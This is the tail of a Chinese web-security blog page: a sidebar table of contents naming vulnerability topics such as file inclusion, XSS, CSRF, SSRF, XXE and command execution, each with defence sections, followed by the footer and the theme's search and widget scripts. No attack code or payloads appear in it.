          (2)服务器解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">
          文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8"><span class="toc-text">
          (1)利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%98%B2%E5%BE%A1"><span class="toc-text">
          (2)防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">
          文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="toc-text">
          (1)函数解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">
          (2)漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">
          ①本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">
          ②远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">
          (3)其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">
          ①包含日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8C%85%E5%90%ABSession"><span class="toc-text">
          ②包含Session</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
          (4)伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BD%BF%E7%94%A8%E4%BE%8B%E5%AD%90"><span class="toc-text">
          ①使用例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%90%84%E7%A7%8D%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
          ②各种伪协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1"><span class="toc-text">
          (5)防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5"><span class="toc-text">
          漏洞SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EXSS"><span class="toc-text">
          漏洞XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A7%8D%E7%B1%BB"><span class="toc-text">
          (1)种类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">
          ①存储型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">
          ②反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2DOM%E5%9E%8B"><span class="toc-text">
          ③DOM型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3%E6%94%BB%E5%87%BB"><span class="toc-text">
          (2)危害攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8C%96%E6%8E%98"><span class="toc-text">
          (3)挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">
          (4)触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B2XSS%E7%9A%84Payload%E5%A4%A7%E5%85%A8%EF%BC%9A"><span class="toc-text">
          ▲XSS的Payload大全：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B2XSS%E7%9A%84%E9%A2%98%E7%9B%AE%E5%A4%A7%E5%85%A8"><span class="toc-text">
          ▲XSS的题目大全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-XSS%E6%94%BB%E5%87%BB%E5%B9%B3%E5%8F%B0"><span class="toc-text">
          (5)XSS攻击平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E7%9B%97%E5%8F%96"><span class="toc-text">
          Cookie盗取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E9%98%B2%E5%BE%A1"><span class="toc-text">
          (6)防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BB%A3%E7%A0%81%E9%98%B2%E5%BE%A1"><span class="toc-text">
          ①代码防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-text">
          ②安全设备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E6%8E%A7%E5%88%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BE%93%E5%85%A5%E8%A7%84%E5%88%99"><span class="toc-text">
          ③控制客户端输入规则</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9ECSRF"><span class="toc-text">
          漏洞CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A7%8D%E7%B1%BB-1"><span class="toc-text">
          (1)种类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E5%9E%8B"><span class="toc-text">
          GET型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E5%9E%8B"><span class="toc-text">
          POST型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-text">
          (2)利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%98%B2%E5%BE%A1"><span class="toc-text">
          (3)防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9ESSRF"><span class="toc-text">
          漏洞SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84SSRF"><span class="toc-text">
          (1)可能存在的SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%8A%9F%E8%83%BD%E6%9C%8D%E5%8A%A1"><span class="toc-text">
          ①功能服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%85%B3%E9%94%AE%E5%8F%82%E6%95%B0"><span class="toc-text">
          ②关键参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-text">
          ③关键函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-1"><span class="toc-text">
          (2)利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE"><span class="toc-text">
          ①相关协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-text">
          ②获取敏感文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B-WEB"><span class="toc-text">
          ③内网横向探测-WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E9%A6%96%E5%85%88%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91IP"><span class="toc-text">
          A.首先获取内网IP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">
          B.信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">
          C.内网穿透</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B-Redis-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">
          ③内网横向探测-Redis-未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-dict%E5%8D%8F%E8%AE%AE%E6%B5%8B%E8%AF%95"><span class="toc-text">
          A.dict协议测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="toc-text">
          B.写入木马</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-text">
          XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">
          命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">
          (1)常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0eval-%E5%87%BD%E6%95%B0"><span class="toc-text">
          ①eval()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1assert%E5%87%BD%E6%95%B0"><span class="toc-text">
          ②assert函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2preg-replace%E5%87%BD%E6%95%B0"><span class="toc-text">
          ③preg_replace函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%BD%93"><span class="toc-text">
          ④调用函数过滤不当</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-text">
          ⑤动态函数执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E5%8F%AF%E7%94%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">
          ⑥可用执行命令漏洞函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87"><span class="toc-text">
          (2)绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%98%B2%E5%BE%A1-1"><span class="toc-text">
          (3)防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EJAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">
          漏洞JAVA反序列化</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">139</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">79</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>